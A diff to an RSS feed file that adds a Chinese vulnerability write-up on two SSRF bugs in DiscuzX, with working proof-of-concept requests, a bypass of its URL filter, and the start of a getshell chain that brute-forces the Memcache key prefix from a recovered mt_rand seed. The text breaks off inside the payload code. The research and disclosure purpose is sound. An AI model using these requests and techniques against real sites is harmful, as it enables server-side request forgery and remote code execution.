@@ -5,7 +5,200 @@
 <link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
 <description></description>
 <language>zh-cn</language>
-<lastBuildDate>Thu, 29 Nov 2018 10:22:37 +0800</lastBuildDate>
+<lastBuildDate>Tue, 11 Dec 2018 14:54:55 +0800</lastBuildDate>
+<item>
+<title>DiscuzX 两处 SSRF 挖掘及利用</title>
+<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-12-09-51907363.html</link>
+<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/51907363&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e7d00533c3e1540f6230bcf1746af4b6_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;概述&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我在调试分析 DiscuzX （以下简称 Dz）历史漏洞的时候，发现 Dz 的 SSRF 漏洞其实都是由一个叫&lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt;的函数导致的，并且官方修补方式都是指哪补哪。于是简单过了一遍所有调用&lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt;的地方，最终又找到两处 SSRF。本文将对这两处 SSRF 漏洞成因以及利用方式做简要探讨。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;关键函数 dfsockopen&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;本次漏洞的关键函数&lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt;：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;function dfsockopen($url, $limit = 0, $post = &#39;&#39;, $cookie = &#39;&#39;, $bysocket = FALSE, $ip = &#39;&#39;, $timeout = 15, $block = TRUE, $encodetype  = &#39;URLENCODE&#39;, $allowcurl = TRUE, $position = 0, $files = array()) {
+    require_once libfile(&#39;function/filesock&#39;);
+    return _dfsockopen($url, $limit, $post, $cookie, $bysocket, $ip, $timeout, $block, $encodetype, $allowcurl, $position, $files);
+}&lt;/code&gt;&lt;p&gt;可以看到，&lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt; 具体逻辑都是由 &lt;code class=&quot;inline&quot;&gt;_dfsockopen&lt;/code&gt; 实现的。而 &lt;code class=&quot;inline&quot;&gt;_dfsockopen&lt;/code&gt; 函数代码的大致流程是：对传入的 url 参数首先调用 &lt;code class=&quot;inline&quot;&gt;parse_url&lt;/code&gt; 函数进行解析，然后检测 PHP 环境是否安装了 curl 扩展，如果是，那么接下来会用 curl 对传入的 url 参数发起请求；否则，则用 &lt;code class=&quot;inline&quot;&gt;fsockopen&lt;/code&gt; 对解析出来的 host, port 建立 socket 连接，手动构造发送 HTTP 请求数据包。&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;_dfsockopen&lt;/code&gt; 函数代码比较长，这里只贴出其中调用 curl 进行处理的部分：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    if(function_exists(&#39;curl_init&#39;) &amp;amp;&amp;amp; function_exists(&#39;curl_exec&#39;) &amp;amp;&amp;amp; $allowcurl) {
+        $ch = curl_init();
+        $httpheader = array();
+        if($ip) {
+            $httpheader[] = &quot;Host: &quot;.$host;
+        }
+        if($httpheader) {
+            curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);
+        }
+        curl_setopt($ch, CURLOPT_URL, $scheme.&#39;://&#39;.($ip ? $ip : $host).($port ? &#39;:&#39;.$port : &#39;&#39;).$path);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_HEADER, 1);
+        if($post) {
+            curl_setopt($ch, CURLOPT_POST, 1);
+            if($encodetype == &#39;URLENCODE&#39;) {
+                curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+            } else {
+                foreach($post as $k =&amp;gt; $v) {
+                    if(isset($files[$k])) {
+                        $post[$k] = &#39;@&#39;.$files[$k];
+                    }
+                }
+                foreach($files as $k =&amp;gt; $file) {
+                    if(!isset($post[$k]) &amp;amp;&amp;amp; file_exists($file)) {
+                        $post[$k] = &#39;@&#39;.$file;
+                    }
+                }
+                curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+            }
+        }
+        if($cookie) {
+            curl_setopt($ch, CURLOPT_COOKIE, $cookie);
+        }
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+        $data = curl_exec($ch);
+        $status = curl_getinfo($ch);
+        $errno = curl_errno($ch);
+        curl_close($ch);
+        if($errno || $status[&#39;http_code&#39;] != 200) {
+            return;
+        } else {
+            $GLOBALS[&#39;filesockheader&#39;] = substr($data, 0, $status[&#39;header_size&#39;]);
+            $data = substr($data, $status[&#39;header_size&#39;]);
+            return !$limit ? $data : substr($data, 0, $limit);
+        }
+    }&lt;/code&gt;&lt;p&gt;可以发现，&lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt;没有检查一个请求的地址是否是内网地址。除此之外，它会优先使用 curl 来构造发送请求，curl 是个很强大的网络请求程序，它默认支持的协议很多，其中包括“万能”的协议 gopher：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-4dbbcb7e3345d2bd68a5e5ab9a18e1ea_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1602&quot; data-rawheight=&quot;136&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;gopher 可以构造发送任意内容的数据包：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6f6b82247cf00b6f83d061055351de97_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2564&quot; data-rawheight=&quot;512&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6f6b82247cf00b6f83d061055351de97&quot; data-watermark-src=&quot;v2-3ca725c7aa9349bfcd47c4287dd032c0&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;另外注意一点，这里代码中的 curl 选项配置跟随跳转：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);&lt;/code&gt;&lt;p&gt;众所周知，跟随跳转在 SSRF 中可以 bypass 请求协议限制（虽然这里并没有）。除此之外，由于 Dz 中&lt;code class=&quot;inline&quot;&gt;_xss_check&lt;/code&gt;函数会检查 url 中的特殊字符，如果检查到某些特殊字符就会进行拦截，因此还可以利用跟随跳转来绕过 url 中不能出现特殊字符的限制：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    private function _xss_check() {
+
+        static $check = array(&#39;&quot;&#39;, &#39;&amp;gt;&#39;, &#39;&amp;lt;&#39;, &#39;\&#39;&#39;, &#39;(&#39;, &#39;)&#39;, &#39;CONTENT-TRANSFER-ENCODING&#39;);
+
+        if(isset($_GET[&#39;formhash&#39;]) &amp;amp;&amp;amp; $_GET[&#39;formhash&#39;] !== formhash()) {
+            system_error(&#39;request_tainting&#39;);
+        }
+
+        if($_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;GET&#39; ) {
+            $temp = $_SERVER[&#39;REQUEST_URI&#39;];
+        } elseif(empty ($_GET[&#39;formhash&#39;])) {
+            $temp = $_SERVER[&#39;REQUEST_URI&#39;].file_get_contents(&#39;php://input&#39;);
+        } else {
+            $temp = &#39;&#39;;
+        }
+
+        if(!empty($temp)) {
+            $temp = strtoupper(urldecode(urldecode($temp)));
+            foreach ($check as $str) {
+                if(strpos($temp, $str) !== false) {
+                    system_error(&#39;request_tainting&#39;);
+                }
+            }
+        }
+
+        return true;
+    }&lt;/code&gt;&lt;h2&gt;&lt;b&gt;寻找漏洞&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;所以如果想再找一个 SSRF 的思路就有了，直接找哪些地方调用了 &lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt; 并且 url 参数可控的即可。去年 10 月份的时候更新了两个关于 SSRF 的补丁：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/19fd20f7420397b88278ac1a0dae65fe50012506&quot;&gt;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/19fd20f7420397b88278ac1a0dae65fe50012506&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/76a3c77c979f92dc1633ae581b5359db76096593&quot;&gt;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/76a3c77c979f92dc1633ae581b5359db76096593&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;可以看到官方的修补办法都是简单粗暴，直接关闭对应的功能或者把功能仅限于对管理员开放。所以除了上面的两个已经被修补外，我粗略找了下，又发现了两个。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;imgcropper SSRF&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;source/class/class_image.php&lt;/code&gt; &lt;code class=&quot;inline&quot;&gt;image&lt;/code&gt;类&lt;code class=&quot;inline&quot;&gt;init&lt;/code&gt;方法：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    function init($method, $source, $target, $nosuffix = 0) {
+        global $_G;
+
+        $this-&amp;gt;errorcode = 0;
+        if(empty($source)) {
+            return -2;
+        }
+        $parse = parse_url($source);
+        if(isset($parse[&#39;host&#39;])) {
+            if(empty($target)) {
+                return -2;
+            }
+            $data = dfsockopen($source);
+            $this-&amp;gt;tmpfile = $source = tempnam($_G[&#39;setting&#39;][&#39;attachdir&#39;].&#39;./temp/&#39;, &#39;tmpimg_&#39;);
+            if(!$data || $source === FALSE) {
+                return -2;
+            }
+            file_put_contents($source, $data);
+        }
+        ......
+  }&lt;/code&gt;&lt;p&gt;再找哪些地方调用了&lt;code class=&quot;inline&quot;&gt;image&lt;/code&gt;类的&lt;code class=&quot;inline&quot;&gt;init&lt;/code&gt;方法，发现&lt;code class=&quot;inline&quot;&gt;image&lt;/code&gt;类的&lt;code class=&quot;inline&quot;&gt;Thumb&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;Cropper&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;Watermark&lt;/code&gt;方法都调用了&lt;code class=&quot;inline&quot;&gt;init&lt;/code&gt;。比如&lt;code class=&quot;inline&quot;&gt;Thumb&lt;/code&gt;：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    function Thumb($source, $target, $thumbwidth, $thumbheight, $thumbtype = 1, $nosuffix = 0) {
+        $return = $this-&amp;gt;init(&#39;thumb&#39;, $source, $target, $nosuffix);
+        ......
+    }&lt;/code&gt;&lt;p&gt;所以再找哪些地方调用了&lt;code class=&quot;inline&quot;&gt;image&lt;/code&gt;类的&lt;code class=&quot;inline&quot;&gt;Thumb&lt;/code&gt;方法，最终发现：&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;source/module/misc/misc_imgcropper.php&lt;/code&gt; 52-57行：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    require_once libfile(&#39;class/image&#39;);
+    $image = new image();
+    $prefix = $_GET[&#39;picflag&#39;] == 2 ? $_G[&#39;setting&#39;][&#39;ftp&#39;][&#39;attachurl&#39;] : $_G[&#39;setting&#39;][&#39;attachurl&#39;];
+    if(!$image-&amp;gt;Thumb($prefix.$_GET[&#39;cutimg&#39;], $cropfile, $picwidth, $picheight)) {
+        showmessage(&#39;imagepreview_errorcode_&#39;.$image-&amp;gt;errorcode, null, null, array(&#39;showdialog&#39; =&amp;gt; true, &#39;closetime&#39; =&amp;gt; true));
+    }&lt;/code&gt;&lt;p&gt;下断点调试发现 &lt;code class=&quot;inline&quot;&gt;$_G[&#39;setting&#39;][&#39;ftp&#39;][&#39;attachurl&#39;]&lt;/code&gt; 的值为 &lt;code class=&quot;inline&quot;&gt;/&lt;/code&gt;，而 &lt;code class=&quot;inline&quot;&gt;$_G[&#39;setting&#39;][&#39;attachurl&#39;]&lt;/code&gt; 的值是 &lt;code class=&quot;inline&quot;&gt;data/attachment/&lt;/code&gt;。所以似乎 &lt;code class=&quot;inline&quot;&gt;$prefix&lt;/code&gt; 为 &lt;code class=&quot;inline&quot;&gt;/&lt;/code&gt; 才有 SSRF 利用的可能。&lt;/p&gt;&lt;p&gt;一开始构造 &lt;code class=&quot;inline&quot;&gt;cutimg=/10.0.1.1/get&lt;/code&gt;，这样 &lt;code class=&quot;inline&quot;&gt;$url&lt;/code&gt; 的值就为 &lt;code class=&quot;inline&quot;&gt;//10.0.1.1/get&lt;/code&gt;，按道理来说这应该算是一个正常的 url，但是结果却请求失败了。&lt;/p&gt;&lt;p&gt;仔细跟进 &lt;code class=&quot;inline&quot;&gt;_dfsockopen&lt;/code&gt; 发现，在 PHP 环境安装有 cURL 时，进入 curl 处理的代码分支，直到这里：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;curl_setopt($ch, CURLOPT_URL, $scheme.&#39;://&#39;.($ip ? $ip : $host).($port ? &#39;:&#39;.$port : &#39;&#39;).$path);&lt;/code&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;$scheme&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;$host&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;$port&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;$path&lt;/code&gt; 都是 &lt;code class=&quot;inline&quot;&gt;parse_url&lt;/code&gt; 解析 url 参数后的对应的值，而对像 &lt;code class=&quot;inline&quot;&gt;//10.0.1.1/get&lt;/code&gt; 这样的 url 解析时，&lt;code class=&quot;inline&quot;&gt;$scheme&lt;/code&gt; 的值是 &lt;code class=&quot;inline&quot;&gt;null&lt;/code&gt;，因此最后拼接的结果是 &lt;code class=&quot;inline&quot;&gt;://10.0.1.1/get&lt;/code&gt;，没有协议，curl 最后对这种url的请求会自动在前面加上 &lt;code class=&quot;inline&quot;&gt;HTTP://&lt;/code&gt;，结果就变成了请求 &lt;code class=&quot;inline&quot;&gt;HTTP://://10.0.1.1/get&lt;/code&gt;，这种 url 在我的环境中会导致 curl 报错。&lt;/p&gt;&lt;p&gt;所以我去掉了 curl 扩展，让 &lt;code class=&quot;inline&quot;&gt;_dfsockopen&lt;/code&gt; 函数代码走 socket 发包的流程，踩了 &lt;code class=&quot;inline&quot;&gt;parse_url&lt;/code&gt; 和 Dz 代码的一些坑点（这里就不展开了，有兴趣的同学调下代码就知道了），最后发现像这样构造可以成功：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;cutimg=/:@localhost:9090/dz-imgcropper-ssrf&lt;/code&gt;&lt;p&gt;poc:&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;POST /misc.php?mod=imgcropper&amp;amp;picflag=2&amp;amp;cutimg=/:@localhost:9090/dz-imgcropper-ssrf HTTP/1.1
+Host: ubuntu-trusty.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Cookie: xkmD_2132_sid=E5sbVr; xkmD_2132_saltkey=m6Y8022s; xkmD_2132_lastvisit=1521612483; xkmD_2132_lastact=1521624907%09misc.php%09imgcropper; xkmD_2132_home_readfeed=1521616105; xkmD_2132_seccode=1.ecda87c571707d3f92; xkmD_2132_ulastactivity=a0f4A9CWpermv2t0GGOrf8%2BzCf6dZyAoQ3Sto7ORINqJeK4g3xcX; xkmD_2132_auth=40a4BIESn2PZVmGftNQ2%2BD1ImxpYr0HXke37YiChA2ruG6OryhLe0bUg53XKlioysCePIZGEO1jmlB1L4qbo; XG8F_2132_sid=fKyQMr; XG8F_2132_saltkey=U7lxxLwx; XG8F_2132_lastvisit=1521683793; XG8F_2132_lastact=1521699709%09index.php%09; XG8F_2132_ulastactivity=200fir8BflS1t8ODAa3R7YNsZTQ1k262ysLbc9wdHRzbPnMZ%2BOv7; XG8F_2132_auth=3711UP00sKWDx2Vo1DtO17C%2FvDfrelGOrwhtDmwu5vBjiXSHuPaFVJ%2FC%2BQi1mw4v4pJ66jx6otRFKfU03cBy; XG8F_2132_lip=172.16.99.1%2C1521688203; XG8F_2132_nofavfid=1; XG8F_2132_onlineusernum=3; XG8F_2132_sendmail=1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+
+imgcroppersubmit=1&amp;amp;formhash=f8472648&lt;/code&gt;&lt;p&gt;此时 url 即为&lt;code class=&quot;inline&quot;&gt;//:@localhost:9090/dz-imgcropper-ssrf&lt;/code&gt;。SSRF 请求成功：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-93df11df6c4d4c62d3ece504ab6df48c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1340&quot; data-rawheight=&quot;426&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-93df11df6c4d4c62d3ece504ab6df48c&quot; data-watermark-src=&quot;v2-815e3237c0b985a0c6d5fe8cd432c8a5&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;通过这种方式进行构造利用的话，不太需要额外的限制条件（只要求服务端 PHP 环境没有安装 curl 扩展）￼，但是只能发 HTTP GET 请求，并且服务端不跟随跳转。漏洞危害有限。&lt;/p&gt;&lt;p&gt;后来 l3m0n 师傅也独立发现了这个漏洞，并且他发现较高版本的 curl 是可以成功请求 &lt;code class=&quot;inline&quot;&gt;HTTP://:/&lt;/code&gt; 的，较高版本的 curl 会将这种 url 地址解析到 127.0.0.1 的 80 端口：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d0adaa84880f61a188de94eec474cea9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;834&quot; data-rawheight=&quot;476&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-d0adaa84880f61a188de94eec474cea9&quot; data-watermark-src=&quot;v2-26ed5e568292db52b5ff9839b3efac5f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;最后他再利用之前 PHP &lt;code class=&quot;inline&quot;&gt;parse_url&lt;/code&gt; 的解析 bug（ &lt;a href=&quot;https://bugs.php.net/bug.php?id=73192&quot;&gt;https://bugs.php.net/bug.php?id=73192&lt;/a&gt; ），及利用 &lt;code class=&quot;inline&quot;&gt;parse_url&lt;/code&gt; 和 curl 对 url 的解析差异，成功进行 302 跳转到任意恶意地址，最后再 302 跳转到 gopher 就做到发送任意数据包。详情可以参考 l3m0n 的博客：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/iamstudy/articles/discuz_x34_ssrf_1.html&quot;&gt;Discuz x3.4前台SSRF - l3m0n - 博客园&lt;/a&gt;&lt;/p&gt;&lt;p&gt;但是这种利用方式对 PHP、curl 版本都有特殊的要求，而且要服务端环境接受空 Host 的请求。总的来说，imgcropper SSRF 仍然比较鸡肋。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Weixin Plugin SSRF&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;source/plugin/wechat/wechat.class.php&lt;/code&gt; &lt;code class=&quot;inline&quot;&gt;WeChat&lt;/code&gt;类&lt;code class=&quot;inline&quot;&gt;syncAvatar&lt;/code&gt;方法：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    static public function syncAvatar($uid, $avatar) {
+
+        if(!$uid || !$avatar) {
+            return false;
+        }
+
+        if(!$content = dfsockopen($avatar)) {
+            return false;
+        }
+
+        $tmpFile = DISCUZ_ROOT.&#39;./data/avatar/&#39;.TIMESTAMP.random(6);
+        file_put_contents($tmpFile, $content);
+
+        if(!is_file($tmpFile)) {
+            return false;
+        }
+
+        $result = uploadUcAvatar::upload($uid, $tmpFile);
+        unlink($tmpFile);
+
+        C::t(&#39;common_member&#39;)-&amp;gt;update($uid, array(&#39;avatarstatus&#39;=&amp;gt;&#39;1&#39;));
+
+        return $result;
+    }&lt;/code&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;source/plugin/wechat/wechat.inc.php&lt;/code&gt; 中调用了&lt;code class=&quot;inline&quot;&gt;WeChat::syncAvatar&lt;/code&gt;，直接用&lt;code class=&quot;inline&quot;&gt;$_GET[&#39;avatar&#39;]&lt;/code&gt;作为参数传进去：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;......
+
+elseif(($ac == &#39;register&#39; &amp;amp;&amp;amp; submitcheck(&#39;submit&#39;) || $ac == &#39;wxregister&#39;) &amp;amp;&amp;amp; $_G[&#39;wechat&#39;][&#39;setting&#39;][&#39;wechat_allowregister&#39;]) {
+
+        ......
+
+        $uid = WeChat::register($_GET[&#39;username&#39;], $ac == &#39;wxregister&#39;);
+
+        if($uid &amp;amp;&amp;amp; $_GET[&#39;avatar&#39;]) {
+            WeChat::syncAvatar($uid, $_GET[&#39;avatar&#39;]);
+        }
+
+}&lt;/code&gt;&lt;p&gt;不过因为这里用到了微信登录的插件，所以要利用的话需要目标站开启微信登录：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-92f7c79bdd080b925a61f3d9dfdc303b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1664&quot; data-rawheight=&quot;626&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-92f7c79bdd080b925a61f3d9dfdc303b&quot; data-watermark-src=&quot;v2-6f876f9bceda4185e091e5e9e575051d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这里 SSRF 的构造很简单，直接在&lt;code class=&quot;inline&quot;&gt;avatar&lt;/code&gt;参数构造 url 即可（只是注意&lt;code class=&quot;inline&quot;&gt;wxopenid&lt;/code&gt;参数每次请求都要足够随机保证没有重复，如果重复的话代码是无法走到发起请求的逻辑的）：&lt;/p&gt;&lt;p&gt;poc:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://target/plugin.php?id=wechat:wechat&amp;amp;ac=wxregister&amp;amp;username=vov&amp;amp;avatar=http://localhost:9090/dz-weixin-plugin-ssrf&amp;amp;wxopenid=dont_be_evil&lt;/code&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-191979a78babc6dbbaba9dd357fb1b32_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1332&quot; data-rawheight=&quot;382&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-191979a78babc6dbbaba9dd357fb1b32&quot; data-watermark-src=&quot;v2-418abb5681a74804c21c23aea28940b1&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Dz SSRF getshell&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;乌云关闭前 Jannock 给 Dz 交过需要一定条件命令执行的漏洞，当时由于漏洞还未公开乌云就已关闭所以具体的细节我已不得而知。不过我后来从网上各处搜罗查找资料，发现 chengable 写的一篇分析那个漏洞文章：&lt;a href=&quot;http://chengable.net/index.php/archives/46/&quot;&gt;discuz利用ssrf+缓存应用getshell漏洞分析 - CHENGABLE BLOG&lt;/a&gt; ，从而知道是用 SSRF 篡改缓存从而 getshell。本着学习的态度，我搭环境调试了这个精彩的漏洞利用方式，并且发现除了 Redis，攻击 Memcache 也是可以的，只不过要多踩一个坑。&lt;/p&gt;&lt;p&gt;先说结论：Dz 由 &lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt; 函数导致的 SSRF，如果要 getshell，目标站需要满足以下几个条件：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;服务端 PHP 环境安装有 curl 扩展（为了通过 curl 使用 gopher 协议）&lt;/li&gt;&lt;li&gt;使用 Memcache 或未设置密码认证的 Redis 进行缓存&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;由于 imgcropper SSRF 利用限制较多，所以这里我用 Weixin Plugin SSRF进行演示。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;SSRF 攻击 Memcache&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Dz 整合 Memcache 配置成功后，默认情况下网站首页右下角会出现&lt;code class=&quot;inline&quot;&gt;MemCache On&lt;/code&gt;的标志：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9a09681c05a0d2850344cbf3afe7ce76_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;814&quot; data-rawheight=&quot;98&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;Dz 在安装的时候，对于缓存中的键名加了随机字符串作为前缀。所以如果 SSRF 要攻击 Memcache ，第一个问题是，如何找到正确的键名？&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;install/index.php&lt;/code&gt; 345-357行：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;        $uid = DZUCFULL ? 1 : $adminuser[&#39;uid&#39;];
+        $authkey = md5($_SERVER[&#39;SERVER_ADDR&#39;].$_SERVER[&#39;HTTP_USER_AGENT&#39;].$dbhost.$dbuser.$dbpw.$dbname.$username.$password.$pconnect.substr($timestamp, 0, 8)).random(18);
+        $_config[&#39;db&#39;][1][&#39;dbhost&#39;] = $dbhost;
+        $_config[&#39;db&#39;][1][&#39;dbname&#39;] = $dbname;
+        $_config[&#39;db&#39;][1][&#39;dbpw&#39;] = $dbpw;
+        $_config[&#39;db&#39;][1][&#39;dbuser&#39;] = $dbuser;
+        $_config[&#39;db&#39;][1][&#39;tablepre&#39;] = $tablepre;
+        $_config[&#39;admincp&#39;][&#39;founder&#39;] = (string)$uid;
+        $_config[&#39;security&#39;][&#39;authkey&#39;] = $authkey;
+        $_config[&#39;cookie&#39;][&#39;cookiepre&#39;] = random(4).&#39;_&#39;;
+        $_config[&#39;memory&#39;][&#39;prefix&#39;] = random(6).&#39;_&#39;;
+
+        save_config_file(ROOT_PATH.CONFIG, $_config, $default_config);&lt;/code&gt;&lt;p&gt;这是 Dz 在安装的时候的一段代码，这段代码设置了 authkey、Cookie 前缀以及缓存键名前缀，其中用到了&lt;code class=&quot;inline&quot;&gt;random&lt;/code&gt;函数生成随机字符串。所以跟进这个&lt;code class=&quot;inline&quot;&gt;random&lt;/code&gt;：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;function random($length) {
+    $hash = &#39;&#39;;
+    $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;;
+    $max = strlen($chars) - 1;
+    PHP_VERSION &amp;lt; &#39;4.2.0&#39; &amp;amp;&amp;amp; mt_srand((double)microtime() * 1000000);
+    for($i = 0; $i &amp;lt; $length; $i++) {
+        $hash .= $chars[mt_rand(0, $max)];
+    }
+    return $hash;
+}&lt;/code&gt;&lt;p&gt;可以发现，如果 PHP 版本大于 4.2.0，那么 &lt;code class=&quot;inline&quot;&gt;mt_rand&lt;/code&gt; 随机数的种子是不变的。也就是说，生成 authkey、Cookie 前缀以及缓存键名前缀时调用的 &lt;code class=&quot;inline&quot;&gt;mt_rand&lt;/code&gt; 用的都是同一个种子，而 Cookie 前缀是已知的，通过观察 HTTP 请求就可以知道。因此，随机数播种的种子可以被缩到一个极小的范围内进行猜解。这里可以用 &lt;a href=&quot;http://www.openwall.com/php_mt_seed/README&quot;&gt;php_mt_seed&lt;/a&gt; 进行种子爆破。&lt;/p&gt;&lt;p&gt;通过 &lt;code class=&quot;inline&quot;&gt;mt_rand&lt;/code&gt; 种子的猜解，缓存键名前缀的可能性从 62^6 缩小到不到 1000 个，这就完全属于可以爆破的范畴了。对猜解出来的所有可能的缓存键名前缀分别构造 SSRF 请求发送到服务器，最后即能更改某一键名对应的键值。&lt;/p&gt;&lt;p&gt;Memcache 缓存键名的问题解决了，接下来的问题是，缓存数据被加载到哪了？如何通过修改缓存数据来 getshell？&lt;/p&gt;&lt;p&gt;这一部分的思路就可以直接参照 chengable 写的那篇文章了，&lt;code class=&quot;inline&quot;&gt;output_replace&lt;/code&gt; 函数细节有略微变化，但大体思路是一致的，所以我也不再赘述了。&lt;/p&gt;&lt;p&gt;最后准备用 gopher 协议构造 SSRF 的 payload。写这样一段代码（先假设缓存键名前缀是 &lt;code class=&quot;inline&quot;&gt;IwRW7l&lt;/code&gt;）:&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;&amp;lt;?php
+
+$_G[&#39;setting&#39;][&#39;output&#39;][&#39;preg&#39;][&#39;search&#39;][&#39;plugins&#39;] = &#39;/.*/&#39;;
+$_G[&#39;setting&#39;][&#39;output&#39;][&#39;preg&#39;][&#39;replace&#39;][&#39;plugins&#39;] = &#39;phpinfo()&#39;;
+$_G[&#39;setting&#39;][&#39;rewritestatus&#39;] = 1;
+
+$memcache = new Memcache;
